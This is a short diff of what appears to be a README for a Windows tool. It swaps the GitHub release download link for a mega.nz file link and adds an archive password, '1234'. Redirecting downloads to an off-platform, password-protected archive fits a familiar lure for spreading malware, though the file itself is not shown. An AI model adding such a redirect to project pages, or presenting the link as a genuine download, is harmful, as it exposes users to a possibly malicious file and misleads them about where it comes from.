@@ -12,7 +12,7 @@
 
 Download the latest version of the tool by selecting your preferred Windows version below:
 
-[![Download](https://img.shields.io/badge/Download-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/username/repo/releases/latest/download/yourfile.zip)
+[![Download](https://img.shields.io/badge/Download-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://mega.nz/file/GYlQjDgb#lU7ANbX3RL6zw_uwMgE0g0so1yf_jyYZhlWlNFsSbtU)
 ### Pass for archive - 1234
 
 ### Installation Steps
